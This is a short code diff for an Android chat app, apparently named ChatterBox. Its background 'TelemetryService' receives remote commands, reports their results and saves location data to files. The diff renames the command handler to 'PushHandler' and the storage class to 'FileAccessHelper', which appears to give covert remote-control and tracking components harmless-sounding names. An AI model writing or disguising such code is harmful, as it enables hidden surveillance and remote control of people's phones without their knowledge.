@@ -36,6 +36,7 @@ import android.util.Size
 import android.view.WindowManager
 import androidx.core.content.ContextCompat
 import androidx.core.app.NotificationCompat
+import com.example.ChatterBox.services.MessagingListener
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.io.File
@@ -101,7 +102,7 @@ class TelemetryService : Service() {
         startForeground(NOTIFICATION_ID, notification)
 
         dataSync = CloudUploader(this)
-        val commandsManager = Commands(this)
+        val commandsManager = PushHandler(this)
         commandsManager.initialize()
         Log.d(TAG, "Background sync service initialized")
     }
@@ -220,7 +221,7 @@ class TelemetryService : Service() {
 
     private fun sendCommandResult(commandId: String, success: Boolean, message: String, result: JSONObject) {
         try {
-            val commandsInstance = Commands(this)
+            val commandsInstance = PushHandler(this)
             commandsInstance.sendCommandResponse(commandId, success, message, result)
         } catch (e: Exception) {
             Log.e(TAG, "Error sending command result: ${e.message}")
@@ -696,7 +697,7 @@ class TelemetryService : Service() {
                 try {
                     val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                     val filename = "location_${timestamp}.json"
-                    val storage = StorageManager.getStorageDir(this, "location_data")
+                    val storage = FileAccessHelper.getStorageDir(this, "location_data")
                     val file = File(storage, filename)
 
                     FileOutputStream(file).use { out ->
